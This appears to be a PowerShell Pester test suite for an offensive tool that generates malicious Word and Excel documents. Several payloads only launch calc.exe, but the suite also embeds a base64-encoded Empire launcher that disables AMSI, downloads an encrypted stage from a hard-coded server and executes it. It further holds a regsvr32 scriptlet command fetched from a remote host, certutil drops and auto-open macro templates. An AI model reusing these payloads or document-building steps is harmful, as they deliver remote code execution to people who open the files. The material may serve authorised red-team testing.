# Update this as needed
$ls = "C:\Users\jason\Documents\luckystrike"

$lsdb = "$ls\ls.db"
Import-Module PSSQLite
Import-Module Invoke-Obfuscation

function CreateDB() 
{
    Write-Host "Creating new ls.db"
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    Remove-Item $lsdb
    $dbConnNew = New-SQLiteConnection -DataSource $lsdb
    $db = Get-Content "$ls\db.sql" -Raw
    Invoke-SqliteQuery -SQLiteConnection $dbConnNew -Query $db | Out-Null
}

Describe "CreateDB" -Tag "Init" {
    It "Creates a new database" {
        CreateDB
    }
}

. $ls\luckystrike.ps1 -API

Describe "UpdatesAvailable" -Tag "Updates" {
    It "Checks for updates against github." {
        #UpdatesAvailable | Should be $false
    }
}

Describe "Payloads" -Tag "Payloads" {
    It "Adds a new calc.exe shell command payload" {
        Create-DBPayload "Shell-Calc" "1.1.1.1" "443" "Pester" 1 "calc.exe" $null
    }

    It "Adds a new obfuscated shell command payload" {
        $launcher = "powershell -noP -sta -w 1 -enc  WwBSAGUARgBdAC4AQQBTAHMAZQBNAEIATABZAC4ARwBlAHQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBMAHUARQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAFQALgBTAGUAcgB2AGkAQwBlAFAATwBJAE4AVABNAGEATgBhAEcARQBSAF0AOgA6AEUAeABwAGUAQwBUADEAMAAwAEMATwBuAHQASQBOAFUARQA9ADAAOwAkAFcAYwA9AE4AZQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAUwB0AGUAbQAuAE4ARQBUAC4AVwBlAGIAQwBMAGkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AGMALgBIAEUAYQBkAGUAUgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AEMALgBQAHIATwB4AFkAPQBbAFMAWQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAQgBSAGUAUQB1AEUAUwB0AF0AOgA6AEQARQBGAGEAVQBMAFQAVwBFAEIAUABSAE8AWABZADsAJABXAGMALgBQAFIAbwB4AHkALgBDAHIARQBEAGUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAFkAcwB0AGUATQAuAE4ARQBUAC4AQwBSAGUARABFAG4AVABJAGEATABDAEEAYwBoAEUAXQA6ADoARABlAGYAYQBVAGwAdABOAGUAVAB3AG8AcgBLAEMAUgBFAEQAZQBuAHQAaQBBAEwAcwA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWAB0AC4ARQBuAEMATwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQBUAGUAUwAoACcAXwAtAHYAIQBdAFsAZQBsAGsAUgAxADsAKwBOACMAdwBXAD8AWgBPAFMAfQBRAFAARgBZAE0AXgBMAHAAbwA8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAGEARABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AWABxAHMAMQBOAGMAMQAyAHYAcABrAFAAaQBNAHMAeQB5AHkAWQB4AEwAVwB3AG0ASgBzAEEAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMwA3AC4AMQAyADkAOgA4ADAAOAAwACcAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGQAQQB0AEEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAGEAZABEAGEAVABhACgAJABzAGUAUgArACQAVAApADsAJABJAFYAPQAkAEQAYQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAEQAQQB0AEEAWwA0AC4ALgAkAEQAYQBUAGEALgBsAGUAbgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
        Create-DBPayload "Shell-Empire-Obfs" "1.1.1.1" "443" "Pester" 1 $launcher $null
    }

    It "Adds a new regsrv32 shell command payload" {
        $command = "regsvr32 /s /n /u /i:http://172.16.37.129/calc.txt scrobj.dll"
        Create-DBPayload "Shell-Regsrv32-Calc" "1.1.1.1" "443" "Pester" 1 $command $null
    }

    It "Adds a new calc.exe powershell command payload" {
        Create-DBPayload "PS-Calc" "1.1.1.1" "443" "Pester" 2 $null "$ls\test\testpayloads\runcalc.ps1"
    }

    It "Adds a new calc.exe exe command payload" {
        Create-DBPayload "EXE-Calc" "1.1.1.1" "443" "Pester" 3 $null "C:\Windows\System32\Calc.exe"
    }

    It "Adds a new evil.exe irpei exe command payload" {
        Create-DBPayload "EXE-Evil" "1.1.1.1" "443" "Pester" 3 $null "$ls\test\testpayloads\evil.exe"
    }

    It "Adds a new PS empire launcher command payload" {
        Create-DBPayload "PS-Empire" "1.1.1.1" "443" "Pester" 2 $null "$ls\test\testpayloads\launcher.ps1"
    }

    It "Adds a new exe putty.exe payload" {
        Create-DBPayload "EXE-Putty" "1.1.1.1" "443" "Pester" 3 $null "$ls\test\testpayloads\putty.exe"
    }

    It "Adds a new exe com scriptlet payload" {
        Create-DBPayload "COM-Calc" "1.1.1.1" "443" "Pester" 4 $null $null "http://172.16.37.129/calc.txt"
    }
}

Describe "Templates" -Tag "Templates" {

    It "Adds a new xls calendar template" {
        Create-DBTemplate "Pester-XLS-NoMacro" "$ls\test\testpayloads\template-nomacro.xls" "xls"
        Create-DBTemplate "Pester-XLS-Macro-NoAutoOpen" "$ls\test\testpayloads\template-macro-noautoopen.xls" "xls"
        Create-DBTemplate "Pester-XLS-Macro-AutoOpen" "$ls\test\testpayloads\template-macro-autoopen.xls" "xls"
    }

    It "Adds a new doc calendar template" {
        Create-DBTemplate "Pester-DOC-NoMacro" "$ls\test\testpayloads\template-nomacro.doc" "doc"
        Create-DBTemplate "Pester-DOC-Macro-NoAutoOpen" "$ls\test\testpayloads\template-macro-noautoopen.doc" "doc"
        Create-DBTemplate "Pester-DOC-Macro-AutoOpen" "$ls\test\testpayloads\template-macro-autoopen.doc" "doc"
    }
}

Describe "CURRENTTEST" -Tag "CURRENT" {

}

Describe "CreatePayload-PS-Calc-Cellembed-Obfuscated" -Tag "ExcelPayloads" {
    It "1. Creates an excel file with a shell calc payload (shell infection type)" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "1-pester-shell-calc"
    }

    It "2. Creates an excel file with a shell calc payload (meta infection type)" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 8 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "2-pester-shell-calc-meta"
    }

    It "3. Creates an excel file with a powershell calc payload (cellembed type)" {
        $p = Get-PayloadByTitle "PS-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 2 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "3-pester-ps-cellembed-calc"
    }

    It "4. Creates an excel file with a powershell calc payload (cellembed-nonb64 type)" {
        $p = Get-PayloadByTitle "PS-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 3 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "4-pester-ps-cellembednb64-calc"
    }

    It "5. Creates an excel file with a powershell calc payload (cellembed-nonb64 type)" {
        $p = Get-PayloadByTitle "PS-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 3 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "5-pester-ps-cellembednb64-calc"
    }

    It "6. Creates an excel file with a powershell calc payload (cellembed-encrypted type. Key is lab.com)" {
        $p = Get-PayloadByTitle "PS-Calc"
        Clear-ActiveWorking
        $encpayload = Crypt $p.PayloadText "lab.com"
        Add-ActiveWorking $p.ID 4 $p.NumBlocks $encpayload $null
        Create-Excel $null $false $null $false "6-pester-ps-cellembed-enc-calc.xls"
    }
    
    It "7. Creates an excel file with an obfuscated powershell calc payload" {
        $p = Get-PayloadByTitle "PS-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 9 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "7-pester-ps-cellembed-obfs-calc"
    }

    It "8. Creates an excel file with an exe payload (certutil/putty))" {
        $p = Get-PayloadByTitle "EXE-Putty"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 5 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "8-pester-exe-certutil-putty"
    }

    It "9. Creates an excel file with an exe payload (saverun/putty))" {
        $p = Get-PayloadByTitle "EXE-Putty"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 6 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "9-pester-exe-savenrun-putty"
    }

    It "10. Creates an excel file with an exe payload (evil.exe + irpei))" {
        $p = Get-PayloadByTitle "EXE-Evil"
        Clear-ActiveWorking
        Add-ActiveWorking 47734 7 23 
        Add-ActiveWorking $p.ID 7 $p.NumBlocks -customstrings $customstrings
        $customstrings += "|SYSTYPE|,System32"
        Create-Excel $null $false $null $false "10-pester-exe-irpei-evil"
    }

    It "11. Creates an excel file with an exe payload (certutil/putty, shellcommand calc))" {
        Clear-ActiveWorking
        $p1 = Get-PayloadByTitle "EXE-Putty"
        Add-ActiveWorking $p1.ID 5 $p1.NumBlocks $null $null
        $p2 = Get-PayloadByTitle "Shell-Calc"
        Add-ActiveWorking $p2.ID 1 $p2.NumBlocks $null $null
        Create-Excel $null $false $null $false "12-pester-combo-exe-certutil-putty-shell-calc"
    }

    It "12. Creates a excel file with a pubprn.vbs attack" {
        $p = Get-PayloadByTitle "COM-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 10 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "12-pester-com-calc"
    }

    It "13. Creates and excel file with obfuscated shell command payload (empire -> http://172.16.37.129:8080)" {
        $p = Get-PayloadByTitle "Shell-Empire-Obfs"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-Excel $null $false $null $false "13-pester-shell-obfs-empire"
        
        Clear-ActiveWorking
        $p = Get-PayloadByTitle "Shell-Empire-Obfs"
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-Word $null $false $null $false "13-pester-shell-obfs-empire"
    }
}


Describe "CreatePayload-Shell-Calc-Word" -Tag "WordPayloads" {
    It "20. Creates a word file with an shell command payload (calc.exe))" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-Word $null $false $null $false "20-pester-shell-calc"
    }

    It "21. Creates a word file with a metadata command payload (calc.exe))" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 8 $p.NumBlocks $null $null
        Create-Word $null $false $null $false "21-pester-metadata-calc"
    }

    It "22. Creates a word file with a COM regsrv32 payload (calc.exe))" {
        $p = Get-PayloadByTitle "COM-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 12 $p.NumBlocks $null $null
        Create-Word $null $false $null $false "22-pester-com-regsrv32-calc"
    }
}

Describe "CreateFromTemplate-Calc-Word" -Tag "WordTemplates" {
    It "30. Creates a word file with a command payload (calc.exe)) using a nonmacro template" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "doc" -templateselection 1 -filename "30-pester-word-template-nomacro"     
    }

    It "31. Creates a word file with a command payload (calc.exe)) using a macro template noautoopen" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "doc" -templateselection 2 -filename "31-pester-word-template-macro-noautoopen"     
    }

    It "32. Creates a word file with a command payload (calc.exe)) using a macro template autoopen" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "doc" -templateselection 3 -filename "32-pester-word-template-macro-autoopen"     
    }
}

Describe "CreateFromTemplate-Calc-Excel" -Tag "ExcelTemplates" {
    It "40. Creates a excel file with a command payload (calc.exe)) using a nonmacro template" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "xls" -templateselection 1 -filename "40-pester-excel-template-nomacro"     
    }

    It "41. Creates a excel file with a command payload (calc.exe)) using a macro template noautoopen" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "xls" -templateselection 2 -filename "41-pester-excel-template-macro-noautoopen"     
    }

    It "42. Creates a excel file with a command payload (calc.exe)) using a macro template autoopen" {
        $p = Get-PayloadByTitle "Shell-Calc"
        Clear-ActiveWorking
        Add-ActiveWorking $p.ID 1 $p.NumBlocks $null $null
        Create-FileFromTemplate -doctypename "xls" -templateselection 3 -filename "42-pester-excel-template-macro-autoopen"     
    }
}

